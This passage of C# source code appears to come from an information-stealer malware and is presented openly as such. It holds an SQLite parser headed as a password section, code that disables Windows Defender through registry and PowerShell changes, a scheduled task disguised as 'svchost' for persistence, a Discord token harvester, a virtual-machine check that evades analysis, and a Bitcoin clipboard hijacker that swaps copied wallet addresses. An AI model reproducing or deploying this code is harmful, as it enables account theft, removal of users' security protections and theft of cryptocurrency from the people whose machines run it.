                num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                endIndex = this.GVL((int)num);
                num8 = endIndex;
                long num7 = this.CVL((int)num, endIndex);
                long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                for (int j = 0; num10 < num7; j++)
                {
                    _fieldArray = (record_header_field[])Utils.CopyArray((Array)_fieldArray, new record_header_field[j + 1]);
                    endIndex = num8 + 1;
                    num8 = this.GVL(endIndex);
                    _fieldArray[j].type = this.CVL(endIndex, num8);
                    if (_fieldArray[j].type > 9L)
                    {
                        if (this.IsOdd(_fieldArray[j].type))
                        {
                            _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 13L)) / 2.0));
                        }
                        else
                        {
                            _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 12L)) / 2.0));
                        }
                    }
                    else
                    {
                        _fieldArray[j].size = this.SQLDataTypeSize[(int)_fieldArray[j].type];
                    }
                    num10 = (num10 + (num8 - endIndex)) + 1L;
                }
                this.table_entries[length + i].content = new string[(_fieldArray.Length - 1) + 1];
                int num4 = 0;
                int num17 = _fieldArray.Length - 1;
                for (int k = 0; k <= num17; k++)
                {
                    if (_fieldArray[k].type > 9L)
                    {
                        if (!this.IsOdd(_fieldArray[k].type))
                        {
                            if (decimal.Compare(new decimal(this.encoding), decimal.One) == 0)
                            {
                                this.table_entries[length + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                            else if (decimal.Compare(new decimal(this.encoding), 2M) == 0)
                            {
                                this.table_entries[length + i].content[k] = Encoding.Unicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                            else if (decimal.Compare(new decimal(this.encoding), 3M) == 0)
                            {
                                this.table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            this.table_entries[length + i].content[k] = Encoding.Default.GetString(this.db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                        }
                    }
                    else
                    {
                        this.table_entries[length + i].content[k] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size));
                    }
                    num4 += (int)_fieldArray[k].size;
                }
            }
        }
        else if (this.db_bytes[(int)Offset] == 5)
        {
            ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
            int num18 = num14;
            for (int m = 0; m <= num18; m++)
            {
                ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(this.page_size))));
            }
            this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One), new decimal(this.page_size))));
        }
        return true;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct record_header_field
    {
        public long size;
        public long type;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct sqlite_master_entry
    {
        public long row_id;
        public string item_type;
        public string item_name;
        public string astable_name;
        public long root_num;
        public string sql_statement;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct table_entry
    {
        public long row_id;
        public string[] content;
    }
}
//----------------------------------Passwords, ecrypt etc. end----------------------------------//




//----------------------------------Completely Fuck Windows Defender----------------------------------//
class Defender
{
    public static void Disable()
    {
        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

        RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
        RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

        CheckDefender();
        Registrys();

        ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
        {
            Arguments = "/create /tn \"" + "svchost" + "\" /sc ONLOGON /tr \"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\" /rl HIGHEST /f",
            UseShellExecute = false,
            CreateNoWindow = true
        };

        Process.Start(startInfo);


    }


    private static void RegistryEdit(string regPath, string name, string value)
    {
        try
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                if (key == null)
                {
                    Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                    return;
                }
                if (key.GetValue(name) != (object)value)
                    key.SetValue(name, value, RegistryValueKind.DWord);
            }
        }
        catch { }
    }

    private static void CheckDefender()
    {
        Process proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = "Get-MpPreference -verbose",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            }
        };
        proc.Start();
        while (!proc.StandardOutput.EndOfStream)
        {
            string line = proc.StandardOutput.ReadLine();

            if (line.Contains(@"DisableRealtimeMonitoring") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

            else if (line.Contains(@"DisableBehaviorMonitoring") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

            else if (line.Contains(@"DisableBlockAtFirstSeen") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

            else if (line.Contains(@"DisableIOAVProtection") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

            else if (line.Contains(@"DisablePrivacyMode") && line.Contains("False"))
                RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

            else if (line.Contains(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.Contains("False"))
                RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

            else if (line.Contains(@"DisableArchiveScanning") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

            else if (line.Contains(@"DisableIntrusionPreventionSystem") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

            else if (line.Contains(@"DisableScriptScanning") && line.Contains("False"))
                RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

            else if (line.Contains(@"SubmitSamplesConsent") && !line.Contains("2"))
                RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

            else if (line.Contains(@"MAPSReporting") && !line.Contains("0"))
                RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

            else if (line.Contains(@"HighThreatDefaultAction") && !line.Contains("6"))
                RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

            else if (line.Contains(@"ModerateThreatDefaultAction") && !line.Contains("6"))
                RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

            else if (line.Contains(@"LowThreatDefaultAction") && !line.Contains("6"))
                RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

            else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
        }
    }

    private static void RunPS(string args)
    {
        Process proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            }
        };
        proc.Start();
    }


    private static void Registrys()
    {
        Task.Run(async () =>
        {
            try
            {
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);



                // using services to disable windows defender //
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WinDefend", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdBoot", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdFilter", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisDrv", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet001\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\ControlSet002\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\WdNisSvc", "Start", 4, RegistryValueKind.DWord);



                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);

                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "UpdateOnStartUp", 0, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);

                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "SecurityHealthService", 4, RegistryValueKind.DWord);

                // using services to disable windows defender //
                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WdNisSvc", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "WinDefend", 3, RegistryValueKind.DWord);
            }
            catch (Exception)
            {
            }
        });
    }
}
//----------------------------------Completely Fuck Windows Defender end----------------------------------//

class GetDiscordToken
{
    private static readonly string tokenDirectory = "\\Local Storage\\leveldb";
    private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private static readonly string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    public static readonly string temporaryDirectoryPath = Path.Combine(localAppDataPath, "\\temp");
    public static readonly string discordTokenDirectory = Path.Combine(appDataPath, "Discord" + tokenDirectory);
    public static readonly string ptbTokenDirectory = Path.Combine(appDataPath, "discordptb" + tokenDirectory);
    public static readonly string canaryTokenDirectory = Path.Combine(appDataPath, "discordcanary" + tokenDirectory);
    private static readonly Regex tokenRegex = new Regex("([A-Za-z0-9_\\./\\\\-]*)");

    private static List<string> ReadAllLines(string file)
    {
        List<string> list = new List<string>();
        using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
        {
            using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
            {
                while (streamReader.Peek() >= 0)
                {
                    list.Add(streamReader.ReadLine());
                }
            }
        }
        return list;
    }

    private static string TokenRegexCheck(string line)
    {
        foreach (object obj in tokenRegex.Matches(line))
        {
            string value = ((Match)obj).Groups[0].Value;
            if (value.Length == 59 || value.Length == 88)
            {
                return value;
            }
        }
        return "";
    }

    private static string PerformTokenCheck(string line)
    {
        if (line.Contains("[oken"))
        {
            return TokenRegexCheck(line);
        }
        if (line.Contains(">oken"))
        {
            return TokenRegexCheck(line);
        }
        if (line.Contains("token>"))
        {
            foreach (object obj in tokenRegex.Matches(line))
            {
                Match match = (Match)obj;
                if (match.Length >= 59)
                {
                    return match.Value;
                }
            }
        }
        return "";
    }

    public static List<string> RetrieveDiscordTokens()
    {
        List<string> tokens = new List<string>();
        List<string> paths = new List<string>(new string[]
        {
                discordTokenDirectory,
                ptbTokenDirectory,
                canaryTokenDirectory
        });
        List<string> files = new List<string>();
        foreach (string path in paths)
        {
            if (Directory.Exists(path))
            {
                IEnumerable<string> collection = from specifiedFile in Directory.EnumerateFiles(path)
                                                 where specifiedFile.EndsWith(".ldb") || specifiedFile.EndsWith(".log")
                                                 select specifiedFile;
                files.AddRange(collection);
            }
        }
        foreach (string file in files)
        {
            foreach (string line in ReadAllLines(file))
            {
                if (!(PerformTokenCheck(line) == ""))
                {
                    tokens.Add(PerformTokenCheck(line));
                }
            }
        }
        return tokens;
    }
}


internal class VirtualMachine
{
    public static void CheckVM()
    {
        if (VirtualMachine.DetectVM())
        {
            Environment.Exit(0);
        }
    }

    private static bool DetectVM()
    {
        try
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    {
                        string text = managementBaseObject["Manufacturer"].ToString().ToLower();
                        if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox" || VirtualMachine.GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("SxIn.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("SbieDll.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("Sf2.dll").ToInt32() != 0 || VirtualMachine.GetModuleHandle("snxhk.dll").ToInt32() != 0)
                        {
                            return true;
                        }
                    }
                }
            }
        }
        catch
        {
        }
        return false;
    }

    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string running);
}

class Clipper
{
    internal static class PatternRegex
    {
        public readonly static Regex btc = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b");
    }
    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
}

internal static class Clipboard
{
    public static string GetText()
    {
        string ReturnValue = string.Empty;
        Thread STAThread = new Thread(
            delegate ()
            {
                ReturnValue = System.Windows.Forms.Clipboard.GetText();
            });
        STAThread.SetApartmentState(ApartmentState.STA);
        STAThread.Start();
        STAThread.Join();

        return ReturnValue;
    }

    public static void SetText(string txt)
    {
        Thread STAThread = new Thread(
            delegate ()
            {
                System.Windows.Forms.Clipboard.SetText(txt);
            });
        STAThread.SetApartmentState(ApartmentState.STA);
        STAThread.Start();
        STAThread.Join();
    }
}

public sealed class ClipboardNotification
{
    public class NotificationForm : Form
    {
        private static string currentClipboard = Clipboard.GetText();
        public NotificationForm()
        {
            NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
            NativeMethods.AddClipboardFormatListener(Handle);
        }

        private bool RegexResult(Regex pattern)
        {
            if (pattern.Match(currentClipboard).Success) return true;
            else
                return false;
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
            {
                currentClipboard = Clipboard.GetText();

                if (RegexResult(Clipper.PatternRegex.btc) && !currentClipboard.Contains("#btcAddress"))
                {
                    string result = Clipper.PatternRegex.btc.Replace(currentClipboard, "#btcAddress");
                    Clipboard.SetText(result);
                }
            }
            base.WndProc(ref m);
        }
    }

}